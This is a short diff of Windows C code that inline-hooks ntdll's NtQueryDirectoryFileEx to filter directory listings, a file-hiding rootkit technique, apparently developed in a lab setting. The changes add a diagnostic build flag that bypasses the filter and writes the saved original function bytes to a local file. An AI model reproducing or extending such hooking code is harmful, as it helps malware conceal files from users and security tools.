@@ -166,6 +166,9 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
         FileInformation, Length, FileInformationClass,
         QueryFlags, FileName);
 
+#ifdef FILE_HIDE_DIAG
+    return status;
+#endif
     return filter_entries(status, FileInformation, Length, FileInformationClass);
 }
 
@@ -223,6 +226,19 @@ int file_hide_install(PrefixTable *table)
         GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
     if (g_original_ex) {
         memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
+
+#ifdef FILE_HIDE_DIAG
+        {
+            HANDLE hf = CreateFileA("C:\\lab\\debug_bytes.bin",
+                                    GENERIC_WRITE, 0, NULL,
+                                    CREATE_ALWAYS, 0, NULL);
+            if (hf != INVALID_HANDLE_VALUE) {
+                DWORD w;
+                WriteFile(hf, g_saved_ex, PATCH_SIZE, &w, NULL);
+                CloseHandle(hf);
+            }
+        }
+#endif
 
         g_trampoline_ex = (pNtQueryDirectoryFileEx)
             VirtualAlloc(NULL, TRAMP_SIZE,
